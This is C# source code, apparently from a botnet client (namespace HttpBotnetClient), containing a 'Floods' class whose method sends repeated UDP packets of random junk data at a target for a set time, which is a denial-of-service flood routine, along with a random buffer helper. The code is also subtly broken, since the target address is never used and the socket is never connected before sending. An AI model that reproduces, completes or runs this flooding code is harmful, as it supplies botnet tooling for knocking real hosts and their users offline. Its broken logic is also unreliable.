using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace HttpBotnetClient
{
    class Floods
    {
        bool running;
        public void udpf(IPAddress targetIp, int timeMillis)
        {
            // Do the flood for specified time (milliseconds)
            Stopwatch timer = new Stopwatch();
            timer.Start();
            while (timer.Elapsed.TotalMilliseconds < timeMillis)
            {
                // Define the socket
                Socket conn = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                RandomBufferGenerator bufferGen = new RandomBufferGenerator(65536);
                byte[] packetJunkData = bufferGen.GenerateBufferFromSeed(10 * 1024);
                conn.Send(packetJunkData);
                conn.Close();
            }
        }

    }


    public class RandomBufferGenerator
    {
        private readonly Random _random = new Random();
        private readonly byte[] _seedBuffer;

        public RandomBufferGenerator(int maxBufferSize)
        {
            _seedBuffer = new byte[maxBufferSize];

            _random.NextBytes(_seedBuffer);
        }

        public byte[] GenerateBufferFromSeed(int size)
        {
            int randomWindow = _random.Next(0, size);

            byte[] buffer = new byte[size];

            Buffer.BlockCopy(_seedBuffer, randomWindow, buffer, 0, size - randomWindow);
            Buffer.BlockCopy(_seedBuffer, 0, buffer, size - randomWindow, randomWindow);

            return buffer;
        }
    }
}
